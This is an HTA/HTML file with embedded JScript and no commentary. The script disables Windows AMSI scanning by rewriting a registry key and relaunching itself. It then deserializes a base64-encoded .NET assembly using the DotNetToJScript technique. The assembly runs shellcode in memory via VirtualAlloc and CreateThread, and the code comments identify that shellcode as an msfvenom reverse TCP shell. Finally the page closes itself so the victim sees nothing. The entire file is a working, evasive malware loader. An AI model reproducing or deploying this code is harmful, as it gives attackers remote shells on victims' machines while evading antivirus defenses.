<html>
    <head>
        <script language="JScript">
        var sh = new ActiveXObject('WScript.Shell');
	var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
	try{
			var AmsiEnable = sh.RegRead(key);
			if(AmsiEnable!=0){
			throw new Error(1, '');
			}
	}catch(e){
			sh.RegWrite(key, 0, "REG_DWORD");
			sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
			sh.RegWrite(key, 1, "REG_DWORD");
			WScript.Quit(1);
			}
        //xored 169 msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f csharp
        //DotNetToJScript.exe dotnetjs.dll --lang=Jscript --ver=v4 -o dotnet.js
        //dotnet.js --> shell.hta / shell.sct
            function setversion() {
			new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
			}
			function debug(s) {}
			function base64ToStream(b) {
				var enc = new ActiveXObject("System.Text.ASCIIEncoding");
				var length = enc.GetByteCount_2(b);
				var ba = enc.GetBytes_4(b);
				var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
				ba = transform.TransformFinalBlock(ba, 0, length);
				var ms = new ActiveXObject("System.IO.MemoryStream");
				ms.Write(ba, 0, (length / 4) * 3);
				ms.Position = 0;
				return ms;
			}

			var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
			"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
			"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
			"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
			"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
			"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
			"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
			"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
			"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
			"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
			"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
			"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
			"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
			"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
			"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
			"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
			"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
			"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
			"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
			"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
			"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
			"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
			"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAACDwZQAAAAAA"+
			"AAAA8AAiIAsCMAAADAAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"+
			"AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
			"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkKQAA"+
			"HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA6AsAAAAgAAAADAAAAAIAAAAAAAAAAAAAAAAAACAA"+
			"AGAucnNyYwAAAAwEAAAAQAAAAAYAAAAOAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUAvCAAAKgIAAABAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBgBdAAAAAQAAEQIoDwAA"+
			"CiBEAQAAjRIAAAEl0AEAAAQoEAAACiWOaQp+EQAACiAAEAAAIAAwAAAfQCgBAAAGCxYHBigSAAAK"+
			"fhEAAAoWB34RAAAKFn4RAAAKKAIAAAYVKAMAAAYmKiIDKBMAAAomKgAAQlNKQgEAAQAAAAAADAAA"+
			"AHYyLjAuNTA3MjcAAAAABQBsAAAAAAMAACN+AABsAwAA7AMAACNTdHJpbmdzAAAAAFgHAAAEAAAA"+
			"I1VTAFwHAAAQAAAAI0dVSUQAAABsBwAAPAEAACNCbG9iAAAAAAAAAAIAAAFXlQI0CQIAAAD6ATMA"+
			"FgAAAQAAABgAAAAEAAAAAQAAAAUAAAANAAAAEwAAAA8AAAABAAAAAQAAAAEAAAADAAAAAQAAAAEA"+
			"AAACAAAAAQAAAAAAhQIBAAAAAAAGAMgBEQMGADUCEQMGABUB0AIPADEDAAAGAD0BoAIGAKsBoAIG"+
			"AIwBoAIGABwCoAIGAOgBoAIGAAECoAIGAFQBoAIGACkB8gIGAAcB8gIGAG8BoAIGAK0DmQIGAOwA"+
			"EQMGANEAmQIGAFMCmQIGAGMDEQMGAM4DmQIGALYAmQIGAMkCmQIGAHAC8gIKAH8D0AIAAAAAHwAA"+
			"AAAAAQABAAEAEAByAwAAPQABAAEAAAEAACgAAAA9AAEABgATAQAAAQAAAEUAAgAGADMBRwBCAAAA"+
			"AACAAJEgkQBGAAEAAAAAAIAAkSCpAE4ABQAAAAAAgACRIKADWAALAEggAAAAAIYYwwIGAA0AsSAA"+
			"AAAAhgB8AxAADQAAAAEAhwMAAAIAZAIAAAMA2wAAAAQAtAMAAAEAQAMAAAIAWAIAAAMAkQMAAAQA"+
			"twIAAAUAUwMAAAYAngAAAAEAyQAAAAIA4wIAAAEAawIJAMMCAQARAMMCBgAZAMMCCgApAMMCEAAx"+
			"AMMCEAA5AMMCEABBAMMCEABJAMMCEABRAMMCEABZAMMCEABhAMMCFQBpAMMCEABxAMMCEACBAMMC"+
			"BgB5AMMCBgCZAMQDHwCxALICJwC5AOQDKgDBAL4DMwAuAAsAXgAuABMAZwAuABsAhgAuACMAjwAu"+
			"ACsApAAuADMAzgAuADsAzgAuAEMAjwAuAEsA1AAuAFMAzgAuAFsAzgAuAGMA+QAuAGsAIwFDAFsA"+
			"MAFjAHMANgEBAEQBAAAEABoAeAJBAQMAkQABAAABBQCpAAEAAAEHAKADAQCgKgAAAQAEgAAAAQAA"+
			"AAAAAAAAAAAAAADUAwAAAgAAAAAAAAAAAAAAOQCIAAAAAAACAAAAAAAAAAAAAAA5AJkCAAAAAAQA"+
			"AwAAAAAAAF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9MzI0ADxNb2R1bGU+ADxQcml2YXRlSW1w"+
			"bGVtZW50YXRpb25EZXRhaWxzPgAyOTMwQTYzQTM0QjNDNjU2QUU1NUUxQTVENzE2M0YxM0Q2MDU5"+
			"NUY4RUVEOTdCRDlGN0YzRUE4REE1MDMxQkZGAG1zY29ybGliAFZpcnR1YWxBbGxvYwBscFRocmVh"+
			"ZElkAENyZWF0ZVRocmVhZABSdW50aW1lRmllbGRIYW5kbGUAaEhhbmRsZQBWYWx1ZVR5cGUAZmxB"+
			"bGxvY2F0aW9uVHlwZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERl"+
			"YnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmli"+
			"dXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1"+
			"dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRy"+
			"aWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRy"+
			"aWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRl"+
			"AFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEJ5dGUAZHdTdGFja1NpemUAZHdTaXplAHBh"+
			"dGgATWFyc2hhbABrZXJuZWwzMi5kbGwARXhhbXBsZUFzc2VtYmx5LmRsbABTeXN0ZW0AU3lzdGVt"+
			"LlJlZmxlY3Rpb24AWmVybwBscFBhcmFtZXRlcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0"+
			"aWNzAGR3TWlsbGlzZWNvbmRzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0u"+
			"UnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRl"+
			"cwBkd0NyZWF0aW9uRmxhZ3MAUnVudGltZUhlbHBlcnMAVGVzdENsYXNzAFJ1blByb2Nlc3MAbHBB"+
			"ZGRyZXNzAGxwU3RhcnRBZGRyZXNzAFdhaXRGb3JTaW5nbGVPYmplY3QAZmxQcm90ZWN0AFN0YXJ0"+
			"AEluaXRpYWxpemVBcnJheQBFeGFtcGxlQXNzZW1ibHkAQ29weQAAAAAAAAAA3txnS0wDNUKFKNTR"+
			"PREOTgAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBAcCCBgHAAIBElERVQIGGAgABAEdBQgYCAUA"+
			"ARJhDgi3elxWGTTgiQMGERAHAAQYGAkJCQkABhgYCRgYCRgFAAIJGAkIAQAIAAAAAAAeAQABAFQC"+
			"FldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAAFAEAD0V4YW1wbGVBc3NlbWJseQAAKQEA"+
			"JEV4YW1wbGUgQXNzZW1ibHkgZm9yIERvdE5ldFRvSlNjcmlwdAAABQEAAAAAJAEAH0NvcHlyaWdo"+
			"dCDCqSBKYW1lcyBGb3JzaGF3IDIwMTcAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMz"+
			"N2FiZTU3NzcAAAwBAAcxLjAuMC4wAAAFAQABAAAEAQAAAAAAAAAAACDwZQAAAAACAAAAHAEAAIAp"+
			"AACACwAAUlNEU5zpYSVu/udLtmw3dGzRXncBAAAAQzpcVXNlcnNcSmFja2llXERlc2t0b3Bcb3Nl"+
			"cFxEb3ROZXRUb0pTY3JpcHQtbWFzdGVyXEV4YW1wbGVBc3NlbWJseVxvYmpceDY0XFJlbGVhc2Vc"+
			"RXhhbXBsZUFzc2VtYmx5LnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAA/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tS"+
			"EItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aL"+
			"DEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnE"+
			"VFBoKYBrAP/VUFBQUEBQQFBo6g/f4P/Vl2oFaH8AAAFoAgABu4nmahBWV2iZpXRh/9WFwHQM/04I"+
			"dexo8LWiVv/VaGNtZACJ41dXVzH2ahJZVuL9ZsdEJDwBAY1EJBDGAERUUFZWVkZWTlZWU1Zoecw/"+
			"hv/VieBOVkb/MGgIhx1g/9W78LWiVmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//VAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"+
			"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAACwAwAAAAAAAAAAAACwAzQAAABW"+
			"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAA"+
			"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"+
			"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEEAMAAAEAUwB0AHIAaQBuAGcA"+
			"RgBpAGwAZQBJAG4AZgBvAAAA7AIAAAEAMAAwADAAMAAwADQAYgAwAAAAYgAlAAEAQwBvAG0AbQBl"+
			"AG4AdABzAAAARQB4AGEAbQBwAGwAZQAgAEEAcwBzAGUAbQBiAGwAeQAgAGYAbwByACAARABvAHQA"+
			"TgBlAHQAVABvAEoAUwBjAHIAaQBwAHQAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA"+
			"AAAAAAAAAEgAEAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABFAHgAYQBtAHAA"+
			"bABlAEEAcwBzAGUAbQBiAGwAeQAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAu"+
			"ADAALgAwAC4AMAAAAEgAFAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAARQB4AGEAbQBwAGwA"+
			"ZQBBAHMAcwBlAG0AYgBsAHkALgBkAGwAbAAAAGIAHwABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBn"+
			"AGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgAEoAYQBtAGUAcwAgAEYAbwByAHMAaABhAHcA"+
			"IAAyADAAMQA3AAAAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAA"+
			"AFAAFAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABFAHgAYQBtAHAAbABlAEEA"+
			"cwBzAGUAbQBiAGwAeQAuAGQAbABsAAAAQAAQAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABF"+
			"AHgAYQBtAHAAbABlAEEAcwBzAGUAbQBiAGwAeQAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIA"+
			"cwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBz"+
			"AGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
			"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"+
			"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
			var entry_class = 'TestClass';

			try {
				setversion();
				var stm = base64ToStream(serialized_obj);
				var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
				var al = new ActiveXObject('System.Collections.ArrayList');
				var d = fmt.Deserialize_2(stm);
				al.Add(undefined);
				var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
				
			} catch (e) {
				debug(e.message);
			}
        </script>
    </head>
    <body>
        <script language="JScript">
            self.close();
        </script>
    </body>
</html>